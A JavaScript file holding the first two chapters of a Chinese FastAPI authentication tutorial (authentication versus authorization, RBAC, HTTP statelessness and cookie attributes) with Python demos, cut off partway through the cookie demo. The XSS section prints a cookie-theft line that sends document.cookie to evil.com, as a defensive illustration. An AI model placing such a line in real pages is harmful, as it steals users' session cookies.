// =============================================================
// FastAPI 企业级认证与授权教程（fastapiauth）第一批章节
// -------------------------------------------------------------
// 本批包含 5 章（第 1-5 章）：
//   fa-what-is-auth       : 认证与授权：概念区分与全貌
//   fa-http-stateless     : HTTP 无状态与 Cookie 原理
//   fa-session-mechanism  : Session 机制：服务端状态管理
//   fa-jwt-structure      : JWT 结构详解：Header、Payload、Signature
//   fa-python-jose        : python-jose：JWT 的生成与校验
// ============================================================

export const chapters = [
  // ============================================================
  // 第 1 章：认证与授权：概念区分与全貌
  // ============================================================
  {
    id: "fa-what-is-auth",
    group: "第一部分 认证基础原理",
    icon: "🔐",
    title: "认证与授权：概念区分与全貌",
    content: `# 认证与授权：概念区分与全貌

## 一、从一次快递签收说起

想象一下你去快递站取包裹的场景：

1. 你走到柜台前，工作人员说："请出示身份证。"
2. 你递上身份证，工作人员比对照片，确认你确实是你声称的那个人。
3. 工作人员在系统里查你的手机号，发现确实有 3 个包裹待取。
4. 工作人员把包裹递给你，你在签收单上签字。

这个过程里藏着两个截然不同的动作：

- **第 2 步**：证明"你是你"——这叫**认证（Authentication）**。
- **第 3-4 步**：决定"你能拿哪些包裹"——这叫**授权（Authorization）**。

很多人把这两个概念混为一谈，但它们解决的是完全不同的问题。认证回答的是"你是谁"，授权回答的是"你能做什么"。把这两件事分开理解，是学好整套认证授权体系的第一道门。

## 二、认证（Authentication）的本质

### 2.1 定义

**认证**是验证一个实体（用户、设备、服务）所声称的身份是否真实的过程。它的输入是"声明"和"凭证"，输出是一个布尔值——真或假。

用公式表达：

\`\`\`
认证(声明, 凭证) -> True | False
\`\`\`

比如：

- 声明："我是张三"
- 凭证："我的密码是 123456"
- 结果：True（密码匹配，认证通过）

### 2.2 三类认证因素

业界把认证因素分成三类，俗称"三类凭证"：

| 因素 | 说明 | 例子 |
|------|------|------|
| 知识因素（Something you know）| 你知道的秘密 | 密码、PIN 码、密保问题 |
| 持有因素（Something you have）| 你拥有的物品 | 手机（短信验证码）、U 盾、动态口令卡 |
| 固有因素（Something you are）| 你本身的特征 | 指纹、人脸、虹膜、声纹 |

只用一个因素的认证叫**单因素认证**（如只用密码）。用两个不同类因素的认证叫**双因素认证**（2FA），比如"密码 + 短信验证码"。因素越多越安全，但用户体验也越繁琐。银行系统常用 2FA，普通论坛只用单因素。

### 2.3 生活类比：身份证

认证就像在机场过安检时出示身份证：

- 安检员看你的身份证（凭证）
- 比对照片和你本人（验证凭证的真实性）
- 确认你确实是身份证上的那个人（认证通过）

注意，这一步**不涉及**你能进哪个登机口、能享受贵宾厅还是普通厅——那都是认证之后的事。

## 三、授权（Authorization）的本质

### 3.1 定义

**授权**是在已经确认身份的前提下，决定这个身份能访问哪些资源、能执行哪些操作的过程。它的输入是"身份"和"操作请求"，输出是"允许"或"拒绝"。

用公式表达：

\`\`\`
授权(身份, 资源, 操作) -> Allow | Deny
\`\`\`

比如：

- 身份：张三（角色：普通员工）
- 资源：工资表
- 操作：查看
- 结果：Deny（只有 HR 能看）

### 3.2 授权模型

常见的授权模型有四种：

#### 1. ACL（Access Control List，访问控制列表）

最朴素的模型：每个资源挂一张"谁能干什么"的清单。

\`\`\`
文件 A.txt -> [张三: 读写, 李四: 只读]
文件 B.txt -> [张三: 只读, 王五: 读写]
\`\`\`

优点：简单直观。缺点：用户多了之后维护噩梦，每加一个用户要改所有资源。

#### 2. RBAC（Role-Based Access Control，基于角色的访问控制）

业界最主流的模型：把权限授予"角色"，再把角色分配给用户。

\`\`\`
角色"HR" -> 权限[查看工资表, 修改员工信息]
用户张三 -> 角色[HR]
\`\`\`

用户和权限解耦，加人只要分配角色即可。企业系统几乎都用 RBAC。

#### 3. ABAC（Attribute-Based Access Control，基于属性的访问控制）

根据用户属性、资源属性、环境属性动态决策。

\`\`\`
规则：如果 用户.部门=="财务" 且 资源.类型=="报表" 且 当前时间.工作日==True 则 Allow
\`\`\`

更灵活，但规则引擎复杂。适合金融、政府等高安全场景。

#### 4. PBAC（Policy-Based Access Control，基于策略的访问控制）

ABAC 的进阶版，用策略语言（如 Rego、XACML）定义复杂策略。云原生时代（K8s、Istio）常用。

### 3.3 生活类比：门禁卡

授权就像公司门禁卡：

- 认证：刷卡确认你是员工张三（卡里存了你的 ID）
- 授权：门禁系统检查张三能不能进机房——普通员工不能，运维工程师能

同一张卡（同一个认证身份），在不同门口的权限不同（不同的授权结果）。

## 四、认证 vs 授权：一张表说清

| 维度 | 认证（Authentication）| 授权（Authorization）|
|------|----------------------|---------------------|
| 回答的问题 | 你是谁？ | 你能做什么？ |
| 发生时机 | 在前 | 在后（依赖认证结果）|
| 输入 | 凭证（密码、令牌）| 身份 + 资源 + 操作 |
| 输出 | 身份或失败 | 允许或拒绝 |
| 英文缩写 | AuthN | AuthZ |
| 常见机制 | 密码、生物识别、OTP | RBAC、ACL、ABAC |
| 失败后果 | 401 Unauthorized | 403 Forbidden |
| 生活类比 | 出示身份证 | 检查能进哪些门 |

注意 HTTP 状态码的区别：

- **401 Unauthorized**：其实是"未认证"——你没登录或登录失效。
- **403 Forbidden**：是"已认证但无权限"——你登录了，但没权限做这件事。

这两个状态码的命名容易让人混淆，记住：401 是"不知道你是谁"，403 是"知道你是谁，但不让你干"。

## 五、完整流程：认证与授权如何协作

一个典型的请求处理流程：

\`\`\`
客户端发请求（带凭证）
        |
        v
  [1] 提取凭证（从 Header、Cookie、Token 里取）
        |
        v
  [2] 认证：验证凭证是否有效
        |
   +----+----+
   |         |
 失败      成功
   |         |
   v         v
 401    [3] 加载用户信息（从数据库查用户、角色、权限）
              |
              v
        [4] 授权：检查用户能否访问该资源
              |
         +----+----+
         |         |
       拒绝      允许
         |         |
         v         v
        403    [5] 执行业务逻辑，返回结果
\`\`\`

认证是授权的前提：没有认证（不知道是谁），就无法授权（无法判断能不能做）。

## 六、常见认证方式对比

### 6.1 Basic 认证

最古老的 HTTP 认证方式。客户端把"用户名:密码"用 Base64 编码后放在 \`Authorization\` 头里。

\`\`\`
Authorization: Basic dXNlcjpwYXNz
\`\`\`

\`dXNlcjpwYXNz\` 就是 \`user:pass\` 的 Base64。

优点：简单，RFC 7617 标准。缺点：密码每次都传，Base64 不是加密，必须配合 HTTPS；无法注销；多用户切换麻烦。

### 6.2 Session 认证

服务端存一份用户状态，给客户端发一个 Session ID（通常通过 Cookie）。后续请求带上这个 ID，服务端查到对应用户。

优点：服务端可主动注销（删 Session 即可）；不暴露密码。缺点：有状态，服务端要存 Session；分布式环境要做 Session 共享（如 Redis）。

### 6.3 Token 认证（JWT）

用户登录后，服务端签发一个 Token（通常是 JWT）。客户端把 Token 放在 \`Authorization: Bearer <token>\` 头里。服务端校验 Token 的签名和过期时间，无需存储。

优点：无状态，天然适合分布式；可携带用户信息。缺点：签发后难以主动失效（除非维护黑名单）；Token 较长。

### 6.4 OAuth2

用于"第三方授权"。比如你用微信登录某个 App，这个 App 拿到的是微信颁发的 Access Token，可以代表你访问你在微信的数据。

OAuth2 不是认证协议，而是"授权框架"。但实际工程中常把它和 OpenID Connect（OIDC）一起用做认证。

### 6.5 对比表

| 方式 | 状态 | 凭证位置 | 适用场景 | 主要缺点 |
|------|------|---------|---------|---------|
| Basic | 无状态 | Authorization 头 | 内部 API、脚本 | 密码每次传输 |
| Session | 有状态 | Cookie | 传统 Web 站点 | 分布式需共享 |
| Token/JWT | 无状态 | Authorization 头 | 前后端分离、移动端 | 难以主动失效 |
| OAuth2 | 视流程 | Authorization 头 | 第三方登录、开放平台 | 流程复杂 |

## 七、企业级认证系统的整体架构

一个完整的企业级认证系统通常包含这些组件：

\`\`\`
                  +-------------------+
                  |   前端 / 客户端    |
                  +---------+---------+
                            |
                     登录 / 携带凭证
                            |
                            v
                  +-------------------+
                  |   API 网关 / BFF   |  <- 统一入口，鉴权前置
                  +---------+---------+
                            |
                            v
                  +-------------------+
                  |  认证服务（AuthN） |  <- 校验凭证、签发令牌
                  +---------+---------+
                            |
                            v
                  +-------------------+
                  |  授权服务（AuthZ） |  <- RBAC/ABAC 决策
                  +---------+---------+
                            |
                            v
                  +-------------------+
                  |  用户 / 权限中心   |  <- 用户、角色、权限数据
                  +---------+---------+
                            |
                            v
                  +-------------------+
                  |   业务 API 服务    |
                  +-------------------+
\`\`\`

关键设计点：

1. **统一入口**：所有请求先过网关，网关做凭证校验，避免每个业务服务重复实现。
2. **认证授权分离**：认证服务只管"发令牌"，授权服务只管"判权限"，各司其职。
3. **用户中心**：用户、角色、权限数据集中管理，避免各服务各存一份。
4. **令牌机制**：通常用 JWT 作为认证令牌，无状态、易扩展。
5. **审计日志**：所有认证、授权事件都要记录，方便追溯。

## 八、FastAPI 认证生态概览

FastAPI 在认证这块提供了原生的 \`Security\` 工具，常用的库有：

| 库 / 工具 | 作用 |
|-----------|------|
| \`fastapi.security.HTTPBasic\` | Basic 认证 |
| \`fastapi.security.HTTPBearer\` | Bearer Token 认证（自动生成 Swagger 输入框）|
| \`fastapi.security.OAuth2PasswordBearer\` | OAuth2 密码模式（最常用）|
| \`python-jose\` / \`PyJWT\` | JWT 的生成与校验 |
| \`passlib[bcrypt]\` | 密码哈希（bcrypt、argon2）|
| \`python-multipart\` | 解析 OAuth2 表单数据 |
| \`fastapi-users\` | 第三方完整用户系统（注册、登录、重置密码）|

本教程后续章节会用这些工具从零搭建一套企业级认证授权系统，包括：

- 密码哈希与校验
- JWT 签发与校验
- OAuth2 密码模式登录
- RBAC 角色权限控制
- Refresh Token 机制
- 第三方 OAuth2 登录
- 多租户权限隔离

## 九、本章小结

| 概念 | 一句话 |
|------|-------|
| 认证 | 证明你是谁 |
| 授权 | 决定你能做什么 |
| 401 | 未认证 |
| 403 | 已认证但无权限 |
| RBAC | 基于角色的授权模型 |
| 2FA | 双因素认证 |

认证和授权是两件不同的事，但它们协作完成"安全访问"这一目标。后续章节我们会从 HTTP 的无状态特性开始，一步步理解为什么需要各种认证机制。

## 十、本章 demo 说明

下面的 demo 用纯 Python 模拟认证和授权的完整流程，包括：

- 用户注册（保存用户名 + 密码哈希）
- 登录认证（校验密码，签发令牌）
- 请求处理（认证 + 授权 + 业务）
- 演示 401（未登录）和 403（无权限）场景

注意：demo 用的是最朴素的实现，重点在演示"流程"，真实工程的密码哈希、JWT 等会在后续章节展开。`,
    code: `"""
第一章 demo：认证与授权的基本流程对比
目标：用纯 Python 模拟一个最小认证授权系统，演示：
  1. 用户注册（保存用户名 + 密码哈希）
  2. 登录认证（校验密码，签发令牌）
  3. 请求处理（认证 -> 授权 -> 业务）
  4. 演示 401 未认证、403 无权限
说明：本 demo 不依赖任何第三方库，密码哈希用 hashlib.sha256 简化处理
      （真实工程应该用 bcrypt / argon2，后续章节会讲）。
"""
import hashlib
import secrets
import time


# ============================================================
# 第一部分：用户存储（模拟数据库）
# ============================================================
# 用一个全局字典模拟用户表，真实工程会存在数据库里
# 结构：{ 用户名: {"password_hash": ..., "salt": ..., "role": ...} }
user_db = {}


def hash_password(password: str, salt: str) -> str:
    """对密码做加盐哈希。

    为什么需要 salt？
    - 如果两个用户密码都是 "123456"，不加 salt 的话哈希值相同，
      攻击者查彩虹表就能反推出密码。
    - 加 salt 后，即使密码相同，哈希值也不同，彩虹表失效。

    这里用 sha256 + salt 演示原理，真实工程用 bcrypt（自带 salt）。
    """
    # 把密码和 salt 拼起来，编码成字节，再做 sha256 哈希
    raw = (password + salt).encode("utf-8")
    return hashlib.sha256(raw).hexdigest()


def register(username: str, password: str, role: str = "user") -> dict:
    """注册新用户。

    参数：
        username: 用户名
        password: 明文密码（仅注册时出现，注册后绝不存储明文）
        role: 角色（user / admin），用于 RBAC 授权
    返回：
        注册结果字典
    """
    # 检查用户名是否已存在
    if username in user_db:
        return {"success": False, "message": "用户名已存在"}

    # 为每个用户生成一个随机 salt（16 字节的十六进制字符串）
    # secrets.token_hex 比 random 安全，适合密码学场景
    salt = secrets.token_hex(16)

    # 把用户信息存进"数据库"
    # 注意：绝不存储明文密码，只存哈希值
    user_db[username] = {
        "password_hash": hash_password(password, salt),
        "salt": salt,
        "role": role,
    }
    return {"success": True, "message": f"用户 {username} 注册成功，角色：{role}"}


# ============================================================
# 第二部分：认证（Authentication）
# ============================================================
# 令牌存储：{ token: username }，模拟服务端签发的令牌
# 真实工程用 JWT（无状态），这里用简化版
token_store = {}


def authenticate(username: str, password: str) -> dict:
    """认证：校验用户名密码，签发令牌。

    认证流程：
        1. 查用户是否存在
        2. 用存的 salt 重新哈希输入的密码
        3. 比对哈希值是否一致
        4. 一致则签发令牌，不一致则失败
    """
    user = user_db.get(username)
    # 用户不存在：返回失败
    # 注意：真实工程里"用户不存在"和"密码错误"的提示要一样，
    # 防止攻击者枚举用户名
    if user is None:
        return {"success": False, "code": 401, "message": "用户名或密码错误"}

    # 用该用户的 salt 哈希输入的密码
    input_hash = hash_password(password, user["salt"])

    # 比对哈希值
    if input_hash != user["password_hash"]:
        return {"success": False, "code": 401, "message": "用户名或密码错误"}

    # 认证通过，签发一个随机令牌
    # secrets.token_urlsafe 生成 URL 安全的随机字符串
    token = secrets.token_urlsafe(32)

    # 把令牌和用户名绑定存起来（真实工程用 JWT，不需要存）
    token_store[token] = {
        "username": username,
        "issued_at": time.time(),
        "expires_at": time.time() + 3600,  # 1 小时后过期
    }
    return {"success": True, "token": token, "message": "认证成功"}


def verify_token(token: str) -> dict:
    """校验令牌，返回用户信息。

    这是认证的延续：每次请求都要校验令牌是否有效。
    """
    info = token_store.get(token)
    # 令牌不存在：未登录或令牌伪造
    if info is None:
        return {"valid": False, "code": 401, "message": "令牌无效，请重新登录"}

    # 检查是否过期
    if time.time() > info["expires_at"]:
        # 过期了，从存储里删掉
        del token_store[token]
        return {"valid": False, "code": 401, "message": "令牌已过期，请重新登录"}

    # 令牌有效，返回用户信息（含用户名，便于后续查角色）
    user = user_db.get(info["username"])
    return {
        "valid": True,
        "username": info["username"],
        "role": user["role"] if user else "user",
    }


# ============================================================
# 第三部分：授权（Authorization）
# ============================================================
# 用一个字典定义"角色 -> 允许的操作列表"
# 这就是 RBAC 的核心：权限挂在角色上，不挂在用户上
role_permissions = {
    "user": ["read:articles", "read:profile", "edit:profile"],
    "admin": ["read:articles", "read:profile", "edit:profile",
              "delete:article", "write:article", "manage:users"],
}


def authorize(username: str, action: str) -> dict:
    """授权：检查用户能否执行某个操作。

    参数：
        username: 用户名（已通过认证）
        action: 要执行的操作，如 "delete:article"
    返回：
        是否允许
    """
    user = user_db.get(username)
    if user is None:
        # 理论上不会走到这，因为前面已经认证过了
        return {"allowed": False, "code": 403, "message": "用户不存在"}

    role = user["role"]
    # 查这个角色被允许的操作列表
    allowed_actions = role_permissions.get(role, [])

    if action in allowed_actions:
        return {"allowed": True, "message": f"角色 {role} 允许执行 {action}"}
    else:
        return {"allowed": False, "code": 403,
                "message": f"角色 {role} 无权执行 {action}"}


# ============================================================
# 第四部分：模拟一个请求处理流程
# ============================================================
def handle_request(token: str, action: str) -> dict:
    """模拟处理一个 API 请求。

    完整流程：认证 -> 授权 -> 业务
    """
    print(f"\\n>>> 收到请求：action={action}")

    # 第 1 步：认证（校验令牌）
    auth_result = verify_token(token)
    if not auth_result["valid"]:
        # 认证失败 -> 401
        print(f"  [认证失败] {auth_result['message']}")
        return {"status": 401, "message": auth_result["message"]}

    print(f"  [认证通过] 用户={auth_result['username']}, 角色={auth_result['role']}")

    # 第 2 步：授权（检查权限）
    authz_result = authorize(auth_result["username"], action)
    if not authz_result["allowed"]:
        # 授权失败 -> 403
        print(f"  [授权失败] {authz_result['message']}")
        return {"status": 403, "message": authz_result["message"]}

    print(f"  [授权通过] {authz_result['message']}")

    # 第 3 步：业务逻辑
    print(f"  [业务执行] 正在执行 {action} ...")
    return {"status": 200, "message": f"操作 {action} 执行成功"}


# ============================================================
# 第五部分：运行演示
# ============================================================
if __name__ == "__main__":
    print("=" * 60)
    print("第一章 demo：认证与授权的基本流程对比")
    print("=" * 60)

    # ---- 场景 1：注册两个用户，一个普通用户，一个管理员 ----
    print("\\n--- 场景 1：注册用户 ---")
    print(register("zhangsan", "pass123", role="user"))
    print(register("adminlee", "admin456", role="admin"))
    # 重复注册演示
    print(register("zhangsan", "pass123", role="user"))

    # ---- 场景 2：登录认证 ----
    print("\\n--- 场景 2：登录认证 ---")
    # 正确密码
    r1 = authenticate("zhangsan", "pass123")
    print(f"张三登录（正确密码）：{r1}")
    # 错误密码
    r2 = authenticate("zhangsan", "wrong")
    print(f"张三登录（错误密码）：{r2}")
    # 不存在的用户
    r3 = authenticate("nobody", "x")
    print(f"不存在用户登录：{r3}")

    # 张三和管理员各登录一次，拿到令牌
    zhangsan_token = authenticate("zhangsan", "pass123")["token"]
    admin_token = authenticate("adminlee", "admin456")["token"]
    print(f"张三令牌：{zhangsan_token[:20]}...")
    print(f"管理员令牌：{admin_token[:20]}...")

    # ---- 场景 3：认证 + 授权完整流程 ----
    print("\\n--- 场景 3：普通用户读文章（应该成功）---")
    print(handle_request(zhangsan_token, "read:articles"))

    print("\\n--- 场景 4：普通用户删文章（应该 403）---")
    print(handle_request(zhangsan_token, "delete:article"))

    print("\\n--- 场景 5：管理员删文章（应该成功）---")
    print(handle_request(admin_token, "delete:article"))

    print("\\n--- 场景 6：不带令牌访问（应该 401）---")
    print(handle_request("", "read:articles"))

    print("\\n--- 场景 7：伪造令牌访问（应该 401）---")
    print(handle_request("fake.token.value", "read:articles"))

    # ---- 场景 8：演示令牌过期 ----
    print("\\n--- 场景 8：手动让令牌过期 ---")
    # 手动把过期时间改成过去
    token_store[zhangsan_token]["expires_at"] = time.time() - 1
    print(handle_request(zhangsan_token, "read:articles"))

    print("\\n" + "=" * 60)
    print("总结：")
    print("  401 = 认证失败（不知道你是谁）")
    print("  403 = 授权失败（知道你是谁，但不让你干）")
    print("  200 = 认证 + 授权都通过，业务执行成功")
    print("=" * 60)
`,
  },

  // ============================================================
  // 第 2 章：HTTP 无状态与 Cookie 原理
  // ============================================================
  {
    id: "fa-http-stateless",
    group: "第一部分 认证基础原理",
    icon: "🌐",
    title: "HTTP 无状态与 Cookie 原理",
    content: `# HTTP 无状态与 Cookie 原理

## 一、从一个尴尬的场景说起

你去一家新开的咖啡店：

1. 第一次去，你点了一杯拿铁，店员不认识你。
2. 第二次去，你期待店员说"还是拿铁吗？"，结果店员问："您要喝什么？"
3. 第三次去，店员依然不记得你。

为什么？因为这家店的店员**没有记忆**——每次接待你都是一次全新的相遇。

HTTP 协议就是这样的"健忘服务员"。不管你第几次访问一个网站，HTTP 协议本身都不会记得你之前来过。这就是**无状态（Stateless）**。

## 二、HTTP 为什么是无状态

### 2.1 什么是"状态"

"状态"指的是"之前交互留下的、影响当前处理的信息"。比如：

- 你登录过 -> 服务端记得你是张三（登录状态）
- 你加了 3 件商品到购物车 -> 服务端记得这 3 件商品（购物车状态）
- 你选了"中文"界面 -> 服务端记得你的语言偏好（偏好状态）

如果协议有状态，它就要"记住"这些信息，每次请求都基于之前的记忆来处理。

### 2.2 为什么 HTTP 设计成无状态

HTTP 无状态不是缺陷，而是**深思熟虑的设计选择**。原因有三：

#### 原因 1：可扩展性

想象一个有状态的服务端：用户的登录信息存在服务器 A 上，下次请求被负载均衡到服务器 B，B 不知道你登录过，你就被踢出去了。要么所有服务器共享状态（复杂），要么用粘性会话（丧失负载均衡灵活性）。

无状态则没有这个问题：任何一台服务器都能处理任何请求，水平扩展极度简单。加机器就行，不用同步状态。

#### 原因 2：可靠性

有状态的服务端，重启就丢状态（用户全被踢下线）。无状态的服务端，重启不影响——所有状态都在客户端或外部存储里。

#### 原因 3：简化设计

无状态让 HTTP 协议本身极其简单：每个请求是独立的，服务端不用维护"会话上下文"。这种简单是 HTTP 能成为互联网基石的重要原因。

### 2.3 无状态的代价

无状态的代价是：**协议本身无法记住任何事**。但 Web 应用又必须记住用户登录状态、购物车内容，怎么办？

答案：**把状态外移**。要么放在客户端（Cookie、Token），要么放在服务端的某个外部存储里（Session、Redis、数据库）。

这就是 Cookie 和 Session 出现的根本原因——**它们是给无状态的 HTTP"打补丁"，让它能用起来像有状态一样**。

## 三、Cookie 的工作原理

### 3.1 Cookie 是什么

Cookie 是一小段**由服务端发送、保存在客户端**的数据。客户端后续请求会自动带上这段数据，让服务端"认出"客户端。

生活类比：你第一次去健身房办卡，前台给你一张会员卡（Set-Cookie）。下次来的时候你带着卡（Cookie 请求头），前台一刷就知道你是谁。

### 3.2 Set-Cookie 响应头

服务端通过响应头 \`Set-Cookie\` 给客户端"发卡"：

\`\`\`
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123; Path=/; HttpOnly; Max-Age=3600
Content-Type: text/html
\`\`\`

一个响应里可以有多个 \`Set-Cookie\` 头，每个发一张卡。

### 3.3 Cookie 请求头

客户端后续请求会**自动**把 Cookie 放在请求头里：

\`\`\`
GET /profile HTTP/1.1
Cookie: session_id=abc123; theme=dark
\`\`\`

注意：多个 Cookie 用分号空格分隔。浏览器自动管理，开发者通常不用手动处理。

### 3.4 完整流程

\`\`\`
客户端                      服务端
  |                            |
  |  POST /login (用户名密码)  |
  | -------------------------> |
  |                            |  校验通过，生成 session_id=abc123
  |                            |
  |  200 OK                    |
  |  Set-Cookie: session_id=abc123; HttpOnly
  | <------------------------- |
  |                            |
  |  浏览器保存 Cookie         |
  |                            |
  |  GET /profile              |
  |  Cookie: session_id=abc123 |
  | -------------------------> |
  |                            |  读取 Cookie，认出用户
  |  200 OK (用户数据)         |
  | <------------------------- |
\`\`\`

## 四、Cookie 的属性

\`Set-Cookie\` 不仅仅是"键=值"，还可以带很多属性。每个属性都解决一个具体问题。

### 4.1 Domain 和 Path

- **Domain**：Cookie 属于哪个域名。比如 \`Domain=example.com\` 表示访问 \`example.com\` 及其子域名时都带这个 Cookie。
- **Path**：Cookie 属于哪个路径。比如 \`Path=/api\` 表示只有访问 \`/api/*\` 时才带。

作用：**控制 Cookie 的作用范围**，避免每个请求都带一堆无关 Cookie，浪费带宽。

### 4.2 Max-Age 和 Expires

- **Max-Age**：Cookie 多少秒后过期。\`Max-Age=3600\` 表示 1 小时后过期。
- **Expires**：Cookie 在哪个具体时间点过期。\`Expires=Wed, 09 Jun 2027 10:18:14 GMT\`。

两者都不设：会话 Cookie，浏览器关闭后删除。

### 4.3 HttpOnly

设置 \`HttpOnly\` 后，**JavaScript 无法通过 \`document.cookie\` 读取这个 Cookie**。只能由浏览器在 HTTP 请求里自动带上。

作用：**防御 XSS 攻击窃取 Cookie**。如果登录 Cookie 没有 HttpOnly，攻击者注入的 JS 就能读走它，冒充用户。

\`\`\`
Set-Cookie: session_id=abc123; HttpOnly
\`\`\`

**经验法则**：所有敏感 Cookie（登录态、CSRF Token）都要加 HttpOnly。

### 4.4 Secure

设置 \`Secure\` 后，**这个 Cookie 只会在 HTTPS 连接下发送**。HTTP 请求不带。

作用：**防止 Cookie 在网络传输中被中间人窃听**。

\`\`\`
Set-Cookie: session_id=abc123; Secure; HttpOnly
\`\`\`

**经验法则**：生产环境所有 Cookie 都应该加 Secure（生产必须 HTTPS）。

### 4.5 SameSite

\`SameSite\` 控制**跨站请求是否带 Cookie**，是防御 CSRF 的利器。三个值：

| 值 | 行为 | 适用场景 |
|----|------|---------|
| \`Strict\` | 完全不带。即使从别的站点点链接过来也不带 | 高安全（银行）|
| \`Lax\` | 顶层导航的 GET 请求带，其他不带 | 默认值，平衡安全与体验 |
| \`None\` | 都带，但必须配合 Secure | 第三方 Cookie（广告追踪）|

**CSRF 攻击回顾**：你登录了银行，又访问了黑客网站，黑客网站里有一个 \`<form action="http://bank.com/transfer" method="POST">\` 自动提交。浏览器会带上你的银行 Cookie，导致转账成功。

\`SameSite=Lax\` 能挡住这种 POST 提交（因为 Lax 模式下跨站 POST 不带 Cookie）。

### 4.6 属性一览表

| 属性 | 作用 | 安全意义 |
|------|------|---------|
| Domain | 作用域名 | 限制范围 |
| Path | 作用路径 | 限制范围 |
| Max-Age / Expires | 过期时间 | 限制时效 |
| HttpOnly | JS 不可读 | 防 XSS |
| Secure | 仅 HTTPS 传输 | 防窃听 |
| SameSite | 跨站策略 | 防 CSRF |

## 五、Cookie 的安全性问题

### 5.1 XSS 窃取 Cookie

如果网站有 XSS 漏洞，攻击者可以注入：

\`\`\`javascript
// 没设 HttpOnly 时，攻击者能读到 Cookie
fetch('https://evil.com/steal?c=' + document.cookie);
\`\`\`

防御：**所有敏感 Cookie 加 HttpOnly**。

### 5.2 CSRF 攻击

如前所述，攻击者诱导用户在已登录状态下提交跨站请求。

防御：

1. **SameSite=Lax 或 Strict**（最有效）
2. **CSRF Token**：表单里放一个随机 Token，服务端校验
3. **关键操作二次确认**（如支付要再输密码）

### 5.3 Cookie 篡改

Cookie 存在客户端，用户可以随意改。如果你把"用户角色"放在 Cookie 里：

\`\`\`
Cookie: role=user
\`\`\`

用户把它改成 \`role=admin\` 就提权了。**永远不要把敏感信息明文存在 Cookie 里**。

防御：

- 敏感信息存服务端（Session 机制）
- 必须存客户端的话，用签名（如 JWT 的 Signature）

### 5.4 Cookie 注入

服务端如果直接把 Cookie 值拼到 SQL 或 HTML 里，会导致 SQL 注入或 XSS。

防御：**永远不要信任客户端输入**，包括 Cookie。要像对待查询参数一样对 Cookie 做校验和参数化。

## 六、Cookie vs 自定义请求头

Cookie 是浏览器自动管理的，但前后端分离时代，越来越多应用改用自定义头（如 \`Authorization: Bearer <token>\`）携带凭证。对比：

| 维度 | Cookie | 自定义头（如 Authorization）|
|------|--------|---------------------------|
| 谁管理 | 浏览器自动 | 应用代码手动 |
| 跨站自动带 | 是 | 否（更防 CSRF）|
| 移动端友好 | 一般 | 好 |
| CSRF 风险 | 高（需 SameSite 防御）| 低 |
| 跨域处理 | 需 CORS 配置 + credentials | 普通 CORS |

前后端分离 API 通常选自定义头（Bearer Token），传统 Web 站点（SSR）常用 Cookie。

## 七、Cookie 的实际限制

### 7.1 大小限制

每个域名下的 Cookie 数量和单个 Cookie 的大小都有限制：

| 浏览器 | 单个 Cookie 上限 | 每域名 Cookie 数上限 |
|--------|------------------|---------------------|
| Chrome | 4096 字节（约 4KB）| 180 个 |
| Firefox | 4097 字节 | 150 个 |
| Safari | 4097 字节 | 180 个 |

注意 4KB 包含名称、值、属性等所有内容。超出会被截断，导致 Cookie 损坏。

**实践建议**：

- Cookie 只存小段标识（如 Session ID），不要存大数据
- 购物车内容、用户资料等大数据存服务端
- 如果数据必须放客户端，用 LocalStorage（5-10MB）

### 7.2 性能影响

浏览器**每次请求**都会自动带上符合条件的 Cookie。如果 Cookie 很多很大，每个请求的 Header 都会变大，浪费带宽。

**实践建议**：

- 用 \`Path\` 限制静态资源请求不带 Cookie（静态资源放 CDN 或独立域名）
- 非必要的 Cookie 设短过期时间
- 敏感 Cookie 和偏好 Cookie 分开管理

### 7.3 跨域 Cookie 的麻烦

Cookie 默认只在同域请求时发送。跨域请求要带 Cookie 需要同时满足：

1. 前端：\`fetch\` 加 \`credentials: 'include'\`
2. 后端：CORS 设 \`Access-Control-Allow-Credentials: true\`
3. 后端：\`Access-Control-Allow-Origin\` 不能是 \`*\`，必须是具体域名

这就是为什么前后端分离 API 常改用 Authorization 头——避开 Cookie 跨域的麻烦。

## 八、在 FastAPI 里操作 Cookie

FastAPI 通过 \`Cookie\` 声明参数来读取请求 Cookie：

\`\`\`python
from fastapi import FastAPI, Cookie, Response

app = FastAPI()

@app.post("/login")
def login(response: Response):
    # 通过 response.set_cookie 设置响应 Cookie
    response.set_cookie(
        key="session_id",
        value="abc123",
        httponly=True,
        secure=True,
        samesite="lax",
        max_age=3600,
    )
    return {"message": "登录成功"}

@app.get("/profile")
def profile(session_id: str | None = Cookie(default=None)):
    # 通过 Cookie() 读取请求 Cookie
    if session_id is None:
        return {"error": "未登录"}
    return {"session_id": session_id}
\`\`\`

## 九、本章小结

| 概念 | 一句话 |
|------|-------|
| HTTP 无状态 | 协议本身不记忆，每次请求独立 |
| Cookie | 客户端存储的小段数据，由服务端 Set-Cookie 下发 |
| HttpOnly | JS 不可读，防 XSS |
| Secure | 仅 HTTPS 传输，防窃听 |
| SameSite | 跨站策略，防 CSRF |
| Cookie 不可信 | 客户端可篡改，敏感信息要存服务端或签名 |
| 大小限制 | 单个 Cookie ~4KB，别存大数据 |

## 十、本章 demo 说明

下面的 demo 用纯 Python 模拟 Cookie 的完整生命周期：

- 模拟服务端通过 Set-Cookie 头下发 Cookie
- 模拟浏览器保存、自动带 Cookie
- 演示 HttpOnly、Secure、SameSite 属性的影响
- 演示 Cookie 过期、跨域限制`,
    code: `"""
第二章 demo：Cookie 的设置和读取过程模拟
目标：用纯 Python 模拟浏览器和服务端的 Cookie 交互，演示：
  1. 服务端通过 Set-Cookie 下发 Cookie
  2. 浏览器保存并管理 Cookie
  3. 后续请求自动带上符合条件的 Cookie
  4. 演示 HttpOnly / Secure / SameSite / Path / Domain / Max-Age 的作用
说明：本 demo 不依赖第三方库，模拟浏览器行为帮助理解 Cookie 机制
"""
import time


# ============================================================
# 第一部分：定义 Cookie 数据结构
# ============================================================
class Cookie:
    """单个 Cookie 的数据结构。

    一个 Cookie 包含：名称、值、以及各种属性。
    """

    def __init__(self, name, value, domain="", path="/",
                 max_age=None, expires=None,
                 http_only=False, secure=False, samesite="Lax"):
        # Cookie 的名称，如 "session_id"
        self.name = name
        # Cookie 的值，如 "abc123"
        self.value = value
        # 作用域名，如 "example.com"
        self.domain = domain
        # 作用路径，如 "/" 或 "/api"
        self.path = path
        # 最大存活秒数（与 expires 二选一）
        self.max_age = max_age
        # 具体过期时间戳（与 max_age 二选一）
        self.expires = expires
        # 是否只允许 HTTP 传输（JS 不可读）
        self.http_only = http_only
        # 是否仅 HTTPS 传输
        self.secure = secure
        # 跨站策略：Strict / Lax / None
